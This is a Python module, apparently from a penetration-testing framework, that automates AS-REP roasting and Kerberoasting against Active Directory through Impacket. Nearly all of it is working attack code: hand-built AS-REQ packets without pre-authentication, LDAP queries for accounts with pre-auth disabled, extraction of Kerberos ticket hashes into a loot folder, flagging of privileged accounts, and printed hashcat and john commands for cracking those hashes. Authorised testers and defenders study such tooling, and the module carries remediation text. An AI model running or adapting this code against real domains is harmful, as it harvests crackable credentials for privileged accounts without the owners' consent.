"""ASREProasting and Kerberoasting via Impacket.

Two thin wrappers, both following the project subprocess pattern:

* :class:`ASREPRoaster` runs ``GetNPUsers.py`` against the candidate
  user list to extract ``$krb5asrep$`` hashes from accounts whose
  ``UF_DONT_REQUIRE_PREAUTH`` flag is set. It can run **unauthenticated**
  if the account list is supplied (``-no-pass``); with credentials it
  enumerates the directory itself.

* :class:`Kerberoaster` runs ``GetUserSPNs.py -request`` to retrieve
  service tickets for every account that holds a SPN, yielding
  ``$krb5tgs$`` hashes for offline cracking. This attack **requires a
  valid domain credential** (any non-disabled account).

Captured hashes are written to ``loot/<dump-file>`` and persisted as
:class:`Credential` entries (``source="asreproast"`` /
``"kerberoast"``) plus high-severity Findings.
"""

from __future__ import annotations

import datetime
import random
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from pathlib import Path

from core.logger import get_logger
from core.target_manager import Credential, Finding, TargetManager

# Phase label stamped on SOC activities emitted by the roasting wrappers.
_PHASE_3 = "Phase 3 - Credential Harvesting"

try:
    from impacket.krb5 import constants as _krb5_constants                    # type: ignore
    from impacket.krb5.asn1 import (                                           # type: ignore
        AS_REP, AS_REQ, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter,
    )
    from impacket.krb5.kerberosv5 import KerberosError, sendReceive            # type: ignore
    from impacket.krb5.types import KerberosTime, Principal                    # type: ignore
    from pyasn1.codec.der import decoder, encoder                              # type: ignore
    from pyasn1.type.univ import noValue                                       # type: ignore

    _HAS_IMPACKET = True
except Exception:  # pragma: no cover
    _HAS_IMPACKET = False


# Hash prefixes - kept lenient; Impacket varies the encoding type
# field across releases (``$23$``, ``$17$``, ``$18$``).
_RE_ASREP = re.compile(r"^\$krb5asrep\$\d+\$\S+", re.MULTILINE)
_RE_TGS = re.compile(r"^\$krb5tgs\$\d+\$\*?[^\n]+", re.MULTILINE)
_RE_ASREP_USER = re.compile(r"\$krb5asrep\$\d+\$([^@:]+)@", re.IGNORECASE)
_RE_TGS_USER = re.compile(r"\$krb5tgs\$\d+\$\*([^$*]+)\$", re.IGNORECASE)
_RE_TGS_ETYPE = re.compile(r"^\$krb5tgs\$(\d+)\$", re.MULTILINE)

# Groups considered privileged for "interesting hash" classification.
_PRIVILEGED_GROUPS = (
    "domain admins",
    "enterprise admins",
    "schema admins",
    "administrators",
    "account operators",
    "backup operators",
    "print operators",
    "server operators",
    "group policy creator owners",
    "dnsa",        # DNS Admins — often abused for privilege escalation
)

# Hashcat mode per Kerberos encryption type (etype field in the hash).
_HASHCAT_MODE: dict[int, str] = {
    23: "13100",   # RC4-HMAC  — most common, fastest to crack
    17: "19600",   # AES-128
    18: "19700",   # AES-256
}


@dataclass
class RoastResult:
    status: str                                   # completed / failed / error / skipped
    attack: str = ""                              # asreproast / kerberoast
    hashes: list[str] = field(default_factory=list)
    users_with_hashes: list[str] = field(default_factory=list)
    output_file: str = ""
    duration: int = 0
    stdout: str = ""
    stderr: str = ""


class _RoasterBase:
    """Shared subprocess plumbing for the two roasting attacks."""

    DEFAULT_TIMEOUT = 120
    ATTACK = "roast"                              # overridden by subclasses

    def __init__(
        self,
        tm: TargetManager,
        domain: str,
        kdc_ip: str,
        loot_dir: str | Path = "./loot",
        username: str = "",
        password: str = "",
        nthash: str = "",
        binary: str | None = None,
        timeout: int = DEFAULT_TIMEOUT,
        safe_mode: bool = False,
    ):
        self.tm = tm
        self.domain = domain
        self.kdc_ip = kdc_ip
        self.loot_dir = Path(loot_dir)
        self.username = username
        self.password = password
        self.nthash = nthash
        self.binary = binary or self._resolve_binary()
        self.timeout = timeout
        self.safe_mode = safe_mode
        self.log = get_logger()

    # Each subclass declares the impacket script it wraps.
    _BIN_CANDIDATES: tuple[str, ...] = ()

    def _resolve_binary(self) -> str | None:
        import os
        import sys
        # When running as sudo the venv bin dir is not in PATH, so the
        # fallback would land on the system wrapper (e.g.
        # /usr/bin/impacket-GetUserSPNs).  That wrapper uses the system
        # Python shebang but inherits PYTHONPATH from the venv, causing it
        # to load the wrong impacket and crash on missing stdlib modules
        # like ``readline``.  Always check the venv bin directory first.
        venv_bin = Path(sys.executable).parent
        for cand in self._BIN_CANDIDATES:
            venv_path = venv_bin / cand
            if venv_path.is_file() and os.access(venv_path, os.X_OK):
                return str(venv_path)
        for cand in self._BIN_CANDIDATES:
            path = shutil.which(cand)
            if path:
                return path
        return None

    # ------------------------------------------------------------------
    # Common helpers
    # ------------------------------------------------------------------

    def _auth_block(self) -> list[str]:
        """``[domain/]user[:pass]`` plus optional ``-hashes`` block.

        Returns an empty list when no credential is configured (caller
        decides whether that is acceptable for the attack).
        """
        args: list[str] = []
        if self.nthash:
            lmnt = (
                self.nthash if ":" in self.nthash
                else f"aad3b435b51404eeaad3b435b51404ee:{self.nthash}"
            )
            args.extend(["-hashes", lmnt])
        return args

    def _principal(self) -> str:
        """Build the ``DOMAIN/user`` principal Impacket expects."""
        if not self.domain:
            return self.username
        if not self.username:
            return f"{self.domain}/"
        return f"{self.domain}/{self.username}"

    def _common_check(self) -> tuple[bool, str]:
        if self.safe_mode and self.ATTACK == "kerberoast":
            return False, "safe mode enabled - kerberoasting is active and disabled"
        if not self.domain:
            return False, "domain is required"
        if not self.kdc_ip:
            return False, "kdc_ip is required"
        if self.binary is None:
            return False, f"{self._BIN_CANDIDATES[0]} not found in PATH"
        return True, ""

    def _make_outfile(self, name: str) -> Path:
        try:
            self.loot_dir.mkdir(parents=True, exist_ok=True)
        except OSError as exc:
            self.log.warn(f"Could not create loot dir: {exc}")
        return self.loot_dir / name

    def _run_subprocess(self, cmd: list[str]) -> tuple[int, str, str]:
        import sys
        # Run .py scripts via the current interpreter so the correct
        # site-packages are used and shebang / readline conflicts are avoided
        # (a common issue when running as sudo where the script's shebang
        # may resolve to a Python missing optional stdlib modules).
        if cmd and cmd[0].endswith(".py"):
            cmd = [sys.executable] + cmd
        self.log.action(f"{self.ATTACK}: {' '.join(cmd)}")
        # Remember the argv so the finding raised from this roast can carry the
        # command that produced it (rendered in the report).
        self._last_command = " ".join(cmd)
        self.tm.record_command(
            cmd, phase=_PHASE_3, tool=self.ATTACK, target=self.domain or "",
        )
        try:
            proc = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                # Detach stdin from the parent: impacket scripts call
                # ``getpass.getpass`` on missing credentials and would
                # otherwise block forever waiting for terminal input -
                # the symptom is a 120 s timeout with no output.
                stdin=subprocess.DEVNULL,
                text=True,
                timeout=self.timeout,
            )
            return proc.returncode, proc.stdout or "", proc.stderr or ""
        except FileNotFoundError as exc:
            self.log.error(f"{self.ATTACK} binary missing: {exc}")
            return -1, "", str(exc)
        except subprocess.TimeoutExpired as exc:
            self.log.warn(
                f"{self.ATTACK} timed out after {self.timeout}s"
            )
            return -1, "", f"timeout: {exc}"
        except Exception as exc:
            self.log.error(f"{self.ATTACK} crashed: {exc}")
            return -1, "", str(exc)

    def _ldap_get_memberships(self, usernames: list[str]) -> dict[str, str]:
        """Return {username_lower: memberOf_string} for the given accounts.

        Uses an authenticated LDAP query so privileged accounts can be
        flagged for both ASREProast and Kerberoast results.
        """
        if not usernames or not self.username or not (self.password or self.nthash):
            return {}
        try:
            import ldap3  # noqa: PLC0415
            lmnt = (
                self.nthash if ":" in self.nthash
                else f"aad3b435b51404eeaad3b435b51404ee:{self.nthash}"
            ) if self.nthash else None
            server = ldap3.Server(self.kdc_ip, get_info=ldap3.ALL, connect_timeout=10)
            conn = ldap3.Connection(
                server,
                user=f"{self.domain}\\{self.username}",
                password=lmnt or self.password,
                authentication=ldap3.NTLM,
                auto_bind=True,
            )
            base_dn = (
                (server.info.other.get("defaultNamingContext") or [""])[0]
                or ",".join(f"DC={p}" for p in self.domain.split("."))
            )
            # Build a filter for the exact usernames we care about.
            or_clause = "".join(f"(sAMAccountName={u})" for u in usernames[:200])
            ldap_filter = f"(|{or_clause})" if len(usernames) == 1 else f"(&(samAccountType=805306368)(|{or_clause}))"
            conn.search(base_dn, ldap_filter, attributes=["sAMAccountName", "memberOf"])
            result: dict[str, str] = {}
            for entry in conn.entries:
                sam = str(entry.sAMAccountName).strip().lower()
                groups = " ".join(str(g) for g in (entry.memberOf.values if entry.memberOf else []))
                result[sam] = groups
            conn.unbind()
            return result
        except Exception as exc:
            self.log.debug(f"LDAP memberOf query failed: {exc}")
            return {}

    def _flag_privileged(
        self, users: list[str], membership: dict[str, str]
    ) -> list[str]:
        """Return usernames that belong to at least one privileged group."""
        return [
            u for u in users
            if any(pg in membership.get(u.lower(), "").lower() for pg in _PRIVILEGED_GROUPS)
        ]

    def _persist_hashes(
        self,
        hashes: list[str],
        users: list[str],
        source: str,
        finding_severity: str = "high",
    ) -> None:
        for h, user in zip(hashes, users + [""] * (len(hashes) - len(users))):
            self.tm.add_credential(
                Credential(
                    username=user,
                    domain=self.domain,
                    nt_hash=h,           # Re-using the slot to stash the AS-REP / TGS blob
                    source=source,
                )
            )
        if hashes:
            self.tm.add_finding(
                Finding(
                    id=f"{source.upper()}-{self.domain}",
                    title=(
                        f"{len(hashes)} {source} hash(es) captured "
                        f"on {self.domain}"
                    ),
                    severity=finding_severity,
                    host=self.kdc_ip,
                    description=(
                        f"Offline-crackable hashes were extracted from "
                        f"{self.domain}. See loot directory for the "
                        "raw output."
                    ),
                    remediation=(
                        "ASREProast: enforce Kerberos pre-authentication "
                        "on every account. Kerberoast: use long random "
                        "passwords for service accounts and prefer gMSA."
                    ),
                    evidence=hashes[0][:160],
                    command=getattr(self, "_last_command", ""),
                )
            )


# ---------------------------------------------------------------------
# ASREProasting
# ---------------------------------------------------------------------


class ASREPRoaster(_RoasterBase):
    """Wrap ``GetNPUsers.py``."""

    ATTACK = "asreproast"
    _BIN_CANDIDATES = (
        "GetNPUsers.py", "impacket-GetNPUsers", "getnpusers.py", "GetNPUsers",
    )

    def check_prerequisites(self) -> tuple[bool, str]:
        if _HAS_IMPACKET:
            # Native path: binary not required; only domain + KDC + users.
            if not self.domain:
                return False, "domain is required"
            if not self.kdc_ip:
                return False, "kdc_ip is required"
        else:
            ok, reason = self._common_check()
            if not ok:
                return False, reason
        if not (self.password or self.nthash) and not self.tm.users:
            return False, (
                "asreproast needs either a credential or a user list "
                "(populated by Phase 1 user_enum)"
            )
        return True, ""

    # ------------------------------------------------------------------

    def build_command(self, users_file: Path | None) -> list[str]:
        # Construct the principal explicitly per auth mode. Anonymous
        # roasting uses ``DOMAIN/`` (empty user) - supplying a username
        # here would make impacket attempt a bind, which prompts for a
        # password and hangs.
        has_auth = bool(self.password or self.nthash)
        if has_auth and self.password:
            principal = f"{self.domain}/{self.username}:{self.password}"
        elif has_auth:                       # NT-hash auth, no password
            principal = f"{self.domain}/{self.username}"
        else:                                # anonymous AS-REP
            principal = f"{self.domain}/"

        cmd: list[str] = [
            self.binary or "GetNPUsers.py",
            principal,
            "-dc-ip", self.kdc_ip,
        ]
        if not has_auth:
            cmd.append("-no-pass")
        cmd.extend(self._auth_block())       # ``-hashes`` block when nthash given
        if users_file is not None:
            cmd.extend(["-usersfile", str(users_file)])
        # ``-format hashcat`` is the default since Impacket 0.10; we
        # still pass it explicitly to lock the output shape.
        cmd.extend(["-format", "hashcat"])
        # Explicit AS-REP request - required for the LDAP-search code
        # path (when we have credentials and let impacket enumerate
        # accounts itself). Harmless in usersfile mode.
        cmd.append("-request")
        cmd.extend(["-outputfile", str(self._make_outfile("asrep.hash"))])
        return cmd

    # ------------------------------------------------------------------

    def _materialise_userlist(self) -> Path | None:
        """Write tm.users to a tempfile that GetNPUsers can consume."""
        users = sorted(self.tm.users)
        if not users:
            return None
        path = self._make_outfile("asreproast_users.txt")
        path.write_text("\n".join(users) + "\n", encoding="utf-8")
        return path

    # ------------------------------------------------------------------
    # Native Impacket path (no subprocess / no binary required)
    # ------------------------------------------------------------------

    def _build_as_req(self, username: str) -> bytes:
        """Build an AS-REQ without pre-authentication for *username*."""
        domain = self.domain.upper()
        client = Principal(username, type=_krb5_constants.PrincipalNameType.NT_PRINCIPAL.value)
        server = Principal(
            f"krbtgt/{domain}",
            type=_krb5_constants.PrincipalNameType.NT_PRINCIPAL.value,
        )
        pac_req = KERB_PA_PAC_REQUEST()
        pac_req["include-pac"] = True
        pac_encoded = encoder.encode(pac_req)
        as_req = AS_REQ()
        as_req["pvno"] = 5
        as_req["msg-type"] = int(_krb5_constants.ApplicationTagNumbers.AS_REQ.value)
        as_req["padata"] = noValue
        as_req["padata"][0] = noValue
        as_req["padata"][0]["padata-type"] = int(
            _krb5_constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
        )
        as_req["padata"][0]["padata-value"] = pac_encoded
        body = seq_set(as_req, "req-body")
        opts = [
            _krb5_constants.KDCOptions.forwardable.value,
            _krb5_constants.KDCOptions.renewable.value,
            _krb5_constants.KDCOptions.proxiable.value,
        ]
        body["kdc-options"] = _krb5_constants.encodeFlags(opts)
        seq_set(body, "sname", server.components_to_asn1)
        seq_set(body, "cname", client.components_to_asn1)
        body["realm"] = domain
        now = (
            datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None)
            + datetime.timedelta(days=1)
        )
        body["till"] = KerberosTime.to_asn1(now)
        body["rtime"] = KerberosTime.to_asn1(now)
        body["nonce"] = random.getrandbits(31)
        seq_set_iter(
            body,
            "etype",
            (
                int(_krb5_constants.EncryptionTypes.rc4_hmac.value),
                int(_krb5_constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                int(_krb5_constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
            ),
        )
        return encoder.encode(as_req)

    def _is_as_rep(self, reply_bytes: bytes) -> bool:
        """Return True when *reply_bytes* decodes as a genuine AS_REP."""
        try:
            decoder.decode(reply_bytes, asn1Spec=AS_REP())[0]
            return True
        except Exception:
            return False

    def _format_asrep_hash(self, username: str, as_rep_bytes: bytes) -> str | None:
        """Return a hashcat-compatible ``$krb5asrep$`` string from an AS_REP."""
        domain = self.domain.upper()
        try:
            as_rep = decoder.decode(as_rep_bytes, asn1Spec=AS_REP())[0]
            etype = int(as_rep["enc-part"]["etype"])
            cipher_hex = bytes(as_rep["enc-part"]["cipher"]).hex()
        except Exception as exc:
            self.log.debug(f"AS-REP decode failed for {username}: {exc}")
            return None
        if etype in (17, 18):
            return (
                f"$krb5asrep${etype}${username}@{domain}:"
                f"{cipher_hex[-24:]}${cipher_hex[:-24]}"
            )
        return (
            f"$krb5asrep${etype}${username}@{domain}:"
            f"{cipher_hex[:32]}${cipher_hex[32:]}"
        )

    def _ldap_enum_no_preauth(self) -> list[str]:
        """Authenticated LDAP query for all accounts with UF_DONT_REQUIRE_PREAUTH.

        This is the exhaustive path: instead of probing only the usernames
        discovered during Phase 1 (wordlist-limited), we ask the DC directly
        which accounts have Kerberos pre-authentication disabled via the
        userAccountControl bit 0x400000.  Returns sAMAccountNames that were
        not already known and adds them to tm.users.
        """
        try:
            import ldap3  # noqa: PLC0415
        except ImportError:
            self.log.debug("asreproast: ldap3 not available — skipping LDAP enum")
            return []

        if not self.username or not (self.password or self.nthash):
            return []

        lmnt = (
            self.nthash if ":" in self.nthash
            else f"aad3b435b51404eeaad3b435b51404ee:{self.nthash}"
        ) if self.nthash else None

        try:
            server = ldap3.Server(self.kdc_ip, get_info=ldap3.ALL, connect_timeout=10)
            conn = ldap3.Connection(
                server,
                user=f"{self.domain}\\{self.username}",
                password=lmnt or self.password,
                authentication=ldap3.NTLM,
                auto_bind=True,
            )

            base_dn = (
                (server.info.other.get("defaultNamingContext") or [""])[0]
                or ",".join(f"DC={p}" for p in self.domain.split("."))
            )

            # UF_DONT_REQUIRE_PREAUTH = 0x400000 = 4194304
            conn.search(
                base_dn,
                "(&(samAccountType=805306368)"
                "(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                attributes=["sAMAccountName"],
            )

            known = {u.lower() for u in self.tm.users}
            new_users: list[str] = []
            for entry in conn.entries:
                sam = str(entry.sAMAccountName).strip()
                if sam and sam.lower() not in known:
                    new_users.append(sam)
                    self.tm.add_user(sam)

            conn.unbind()
            return new_users

        except Exception as exc:
            self.log.debug(f"asreproast: LDAP enum failed: {exc}")
            return []

    def _run_native(self) -> RoastResult:
        """AS-REQ loop using native Impacket - no external binary needed."""
        domain = self.domain.upper()
        users = sorted(self.tm.users)
        if not users:
            self.log.warn("asreproast: no users in scope for native probe")
            return RoastResult(status="skipped", attack=self.ATTACK, stderr="no users")

        self.log.action(
            f"asreproast (native): probing {len(users)} user(s) on {self.kdc_ip}"
        )
        hashes: list[str] = []
        users_with_hashes: list[str] = []

        for username in users:
            try:
                msg = self._build_as_req(username)
                reply = sendReceive(msg, domain, self.kdc_ip)
                if not self._is_as_rep(reply):
                    self.log.debug(f"asreproast: {username} requires pre-auth")
                    continue
                hash_str = self._format_asrep_hash(username, reply)
                if hash_str:
                    hashes.append(hash_str)
                    users_with_hashes.append(username)
                    self.log.finding(f"[ASREP-ROAST] {username} hash captured")
            except KerberosError as exc:
                code = exc.getErrorCode()
                if code == _krb5_constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                    self.log.debug(f"asreproast: {username} unknown")
                elif code == _krb5_constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                    self.log.debug(f"asreproast: {username} requires pre-auth")
                else:
                    self.log.debug(f"asreproast: {username} Kerberos error: {exc}")
            except Exception as exc:
                self.log.debug(f"asreproast: {username} exception: {exc}")

        outfile = self._make_outfile("asrep.hash")
        if hashes:
            try:
                outfile.write_text("\n".join(hashes) + "\n", encoding="utf-8")
            except OSError as exc:
                self.log.warn(f"Could not write hashes to file: {exc}")
            self._persist_hashes(hashes, users_with_hashes, source="asreproast")
            self.log.success(f"asreproast: {len(hashes)} hash(es) captured (native)")

            # List all ASREPRoastable accounts and flag privileged ones.
            self.log.info(
                f"  ASREPRoastable accounts ({len(users_with_hashes)}): "
                + ", ".join(users_with_hashes)
            )
            membership = self._ldap_get_memberships(users_with_hashes)
            priv = self._flag_privileged(users_with_hashes, membership)
            if priv:
                priv_file = self._make_outfile("asrep_privileged.hash")
                priv_hashes = [
                    h for h, u in zip(hashes, users_with_hashes) if u in priv
                ]
                try:
                    priv_file.write_text("\n".join(priv_hashes) + "\n", encoding="utf-8")
                except OSError:
                    priv_file = None
                self.log.warn(
                    f"  [!] Privileged ASREPRoastable account(s): {', '.join(priv)}"
                )
            else:
                priv_file = None

            target = str(priv_file) if priv_file else str(outfile)
            label = "privileged" if priv_file else "all ASREPRoastable"
            self.log.info(
                f"\n  Crack {label} accounts offline:\n\n"
                f"  hashcat -m 18200 {target} /usr/share/wordlists/rockyou.txt"
                f" -r /usr/share/hashcat/rules/best64.rule\n\n"
                f"  john --wordlist=/usr/share/wordlists/rockyou.txt {target}"
            )
        else:
            self.log.info("asreproast: no ASREProastable accounts found")

        return RoastResult(
            status="completed",
            attack=self.ATTACK,
            hashes=hashes,
            users_with_hashes=users_with_hashes,
            output_file=str(outfile),
        )

    # ------------------------------------------------------------------

    def run(self) -> RoastResult:
        ok, reason = self.check_prerequisites()
        if not ok:
            self.log.warn(f"asreproast skipped: {reason}")
            return RoastResult(status="skipped", attack=self.ATTACK, stderr=reason)

        self.tm.record_activity(
            "asreproast", self.kdc_ip, phase=_PHASE_3,
            details=f"AS-REQ without pre-auth for DONT_REQ_PREAUTH accounts on {self.domain}",
        )

        # Authenticated LDAP query: find ALL accounts with
        # UF_DONT_REQUIRE_PREAUTH regardless of the Phase 1 wordlist.
        # Falls back silently if no credential is available.
        if self.username and (self.password or self.nthash):
            new = self._ldap_enum_no_preauth()
            if new:
                self.log.info(
                    f"asreproast: LDAP found {len(new)} additional "
                    f"candidate(s) not in wordlist: {', '.join(new)}"
                )
            else:
                self.log.debug("asreproast: LDAP enum returned no new candidates")

        # ASREProasting is purely a Kerberos AS-REQ probe per user -
        # equivalent to user enum against a pre-auth-disabled account.
        if self.safe_mode:
            self.log.info("safe mode: ASREProast running in observation mode")

        if _HAS_IMPACKET:
            return self._run_native()

        # Subprocess fallback: invoke GetNPUsers.py.
        users_file = self._materialise_userlist()
        outfile = self._make_outfile("asrep.hash")
        cmd = self.build_command(users_file)
        rc, stdout, stderr = self._run_subprocess(cmd)
        if rc != 0 and rc != -1:
            self.log.warn(f"GetNPUsers exited rc={rc}")
        if rc == -1:
            return RoastResult(
                status="error",
                attack=self.ATTACK,
                stdout=stdout,
                stderr=stderr,
            )

        combined = (stdout + "\n" + stderr)
        if outfile.is_file():
            try:
                combined += "\n" + outfile.read_text(encoding="utf-8")
            except OSError:
                pass
        hashes = _RE_ASREP.findall(combined)
        users = [_RE_ASREP_USER.search(h).group(1) for h in hashes
                 if _RE_ASREP_USER.search(h)]

        self._persist_hashes(hashes, users, source="asreproast")

        self.log.success(f"asreproast: {len(hashes)} hash(es) captured")
        return RoastResult(
            status="completed",
            attack=self.ATTACK,
            hashes=hashes,
            users_with_hashes=users,
            output_file=str(outfile),
            stdout=stdout,
            stderr=stderr,
        )


# ---------------------------------------------------------------------
# Kerberoasting
# ---------------------------------------------------------------------


class Kerberoaster(_RoasterBase):
    """Wrap ``GetUserSPNs.py -request``."""

    ATTACK = "kerberoast"
    _BIN_CANDIDATES = (
        "GetUserSPNs.py", "impacket-GetUserSPNs", "getuserspns.py", "GetUserSPNs",
    )

    def check_prerequisites(self) -> tuple[bool, str]:
        ok, reason = self._common_check()
        if not ok:
            return False, reason
        # Kerberoasting is authenticated.
        if not self.username:
            return False, "kerberoast requires a domain username"
        if not (self.password or self.nthash):
            return False, "kerberoast requires a password or NT hash"
        return True, ""

    def build_command(self) -> list[str]:
        principal = self._principal()
        if self.password:
            principal = f"{principal}:{self.password}"
        cmd: list[str] = [
            self.binary or "GetUserSPNs.py",
            principal,
            "-dc-ip", self.kdc_ip,
            "-request",
        ]
        cmd.extend(self._auth_block())
        cmd.extend(["-outputfile", str(self._make_outfile("kerberoast.hash"))])
        return cmd

    def _parse_spn_table(self, stdout: str) -> dict[str, str]:
        """Parse GetUserSPNs table stdout → {username_lower: MemberOf string}.

        Uses the header line to locate column positions so the parser is
        robust to varying column widths across impacket versions.
        """
        lines = stdout.splitlines()
        header_idx = sep_idx = -1
        for i, line in enumerate(lines):
            if set(line.strip()) <= {"-", " "} and "---" in line:
                sep_idx = i
                header_idx = i - 1
                break
        if sep_idx < 0 or header_idx < 0:
            return {}

        header = lines[header_idx]
        # "Name" also appears inside "ServicePrincipalName" — search for the
        # standalone column header by starting after the SPN column.
        col_spn = header.find("ServicePrincipalName")
        col_name = header.find("Name", col_spn + len("ServicePrincipalName")) if col_spn >= 0 else header.find("Name")
        col_memberof = header.find("MemberOf")
        col_pwdlast = header.find("PasswordLastSet")
        if col_name < 0 or col_memberof < 0:
            return {}

        membership: dict[str, str] = {}
        for line in lines[sep_idx + 1:]:
            if not line.strip() or line.lstrip().startswith("["):
                break
            if len(line) <= col_name:
                continue
            name = line[col_name:col_memberof].strip() if len(line) > col_memberof else line[col_name:].strip()
            memberof = line[col_memberof:col_pwdlast].strip() if len(line) > col_memberof else ""
            if name:
                membership[name.lower()] = memberof
        return membership

    def _privileged_hashes(
        self, hashes: list[str], membership: dict[str, str]
    ) -> list[tuple[str, str]]:
        """Return (hash, username) pairs for accounts in privileged groups."""
        result = []
        for h in hashes:
            m = _RE_TGS_USER.search(h)
            if not m:
                continue
            username = m.group(1).lower()
            groups = membership.get(username, "").lower()
            if any(pg in groups for pg in _PRIVILEGED_GROUPS):
                result.append((h, m.group(1)))
        return result

    def _print_crack_commands(
        self,
        hash_file: Path,
        priv_file: Path | None,
        priv_users: list[str],
    ) -> None:
        """Log hashcat and john commands for the captured hashes."""
        # Determine hashcat mode from the first hash in the file.
        mode = "13100"  # RC4 default
        try:
            content = hash_file.read_text(encoding="utf-8")
            m = _RE_TGS_ETYPE.search(content)
            if m:
                mode = _HASHCAT_MODE.get(int(m.group(1)), "13100")
        except OSError:
            pass

        target = str(priv_file) if priv_file and priv_file.is_file() else str(hash_file)
        label = "privileged accounts" if priv_file and priv_file.is_file() else "all kerberoastable accounts"

        if priv_users:
            self.log.info(
                f"  [!] Privileged kerberoastable account(s): "
                + ", ".join(priv_users)
            )

        self.log.info(
            f"\n  Crack {label} offline:\n\n"
            f"  hashcat -m {mode} {target} /usr/share/wordlists/rockyou.txt"
            f" -r /usr/share/hashcat/rules/best64.rule\n\n"
            f"  john --wordlist=/usr/share/wordlists/rockyou.txt {target}"
        )

    def _sync_clock(self) -> bool:
        """Attempt to sync the system clock with the KDC via ntpdate or rdate.

        Kerberos rejects TGS requests when the client clock differs from the
        KDC by more than 5 minutes (KRB_AP_ERR_SKEW).  This is common in CTF
        and lab environments where the attacker machine is not NTP-synced.
        Returns True when a sync tool was found and ran without error.
        """
        for binary in ("ntpdate", "rdate"):
            path = shutil.which(binary)
            if path is None:
                continue
            if binary == "ntpdate":
                cmd = [path, "-u", self.kdc_ip]
            else:
                cmd = [path, "-s", self.kdc_ip]
            self.log.info(f"kerberoast: syncing clock with {self.kdc_ip} via {binary}")
            try:
                proc = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL,
                    text=True,
                    timeout=15,
                )
                if proc.returncode == 0:
                    self.log.info(f"kerberoast: clock synced — {proc.stdout.strip()}")
                    return True
                self.log.warn(
                    f"kerberoast: {binary} exited rc={proc.returncode}: "
                    f"{proc.stdout.strip()}"
                )
            except Exception as exc:
                self.log.warn(f"kerberoast: clock sync via {binary} failed: {exc}")
        self.log.warn(
            f"kerberoast: could not sync clock (ntpdate/rdate not found). "
            f"Run manually: sudo ntpdate -u {self.kdc_ip}"
        )
        return False

    def run(self) -> RoastResult:
        ok, reason = self.check_prerequisites()
        if not ok:
            self.log.warn(f"kerberoast skipped: {reason}")
            return RoastResult(status="skipped", attack=self.ATTACK, stderr=reason)

        outfile = self._make_outfile("kerberoast.hash")
        cmd = self.build_command()
        self.tm.record_activity(
            "kerberoast", self.kdc_ip, phase=_PHASE_3, command=" ".join(cmd),
            details=f"GetUserSPNs -request: TGS for SPN accounts on {self.domain}",
        )
        rc, stdout, stderr = self._run_subprocess(cmd)

        # Retry once after a clock sync if the KDC rejected us for clock skew.
        if "KRB_AP_ERR_SKEW" in (stdout + stderr):
            if self._sync_clock():
                outfile.unlink(missing_ok=True)
                rc, stdout, stderr = self._run_subprocess(cmd)
        # rc == -1  → subprocess exception (FileNotFoundError / timeout)
        # rc != 0   → script exited with error (e.g. import crash, auth fail)
        if rc == -1:
            return RoastResult(
                status="error", attack=self.ATTACK,
                stdout=stdout, stderr=stderr,
            )
        if rc != 0:
            error_lines = [l for l in (stderr or "").splitlines() if l.strip()]
            hint = error_lines[-1] if error_lines else "(no stderr)"
            self.log.warn(f"kerberoast binary exited rc={rc}: {hint}")
            # Still try to parse whatever was written before the crash.

        combined = stdout + "\n" + stderr
        if outfile.is_file():
            try:
                combined += "\n" + outfile.read_text(encoding="utf-8")
            except OSError:
                pass
        hashes = _RE_TGS.findall(combined)
        users = [_RE_TGS_USER.search(h).group(1) for h in hashes
                 if _RE_TGS_USER.search(h)]

        self._persist_hashes(hashes, users, source="kerberoast")

        if not hashes:
            for line in (stdout + "\n" + stderr).splitlines():
                line = line.strip()
                if line:
                    self.log.debug(f"kerberoast raw: {line}")
            if "KRB_AP_ERR_SKEW" in combined or "Clock skew" in combined:
                self.log.warn(
                    "kerberoast failed: Kerberos clock skew too great — "
                    "sync your clock with the DC and retry:\n"
                    f"  sudo ntpdate -u {self.kdc_ip}\n"
                    f"  # or: sudo rdate -s {self.kdc_ip}"
                )
            else:
                self.log.warn(
                    "kerberoast: 0 TGS hash(es) — run manually to diagnose:\n"
                    f"  sudo .venv/bin/python3 .venv/bin/GetUserSPNs.py "
                    f"{self.domain}/{self.username}:<password> "
                    f"-dc-ip {self.kdc_ip} -request"
                )
        else:
            # Identify privileged accounts from the SPN table in stdout.
            membership = self._parse_spn_table(stdout)
            priv_pairs = self._privileged_hashes(hashes, membership)
            priv_file: Path | None = None

            if priv_pairs:
                priv_file = self._make_outfile("kerberoast_privileged.hash")
                try:
                    priv_file.write_text(
                        "\n".join(h for h, _ in priv_pairs) + "\n",
                        encoding="utf-8",
                    )
                    self.log.warn(
                        f"  [!] {len(priv_pairs)} privileged hash(es) saved to "
                        f"{priv_file}"
                    )
                except OSError as exc:
                    self.log.warn(f"kerberoast: could not write privileged hash file: {exc}")
                    priv_file = None

            self._print_crack_commands(
                outfile,
                priv_file,
                [u for _, u in priv_pairs],
            )

        self.log.success(
            f"kerberoast: {len(hashes)} TGS hash(es) captured"
        )
        return RoastResult(
            status="completed",
            attack=self.ATTACK,
            hashes=hashes,
            users_with_hashes=users,
            output_file=str(outfile),
            stdout=stdout,
            stderr=stderr,
        )
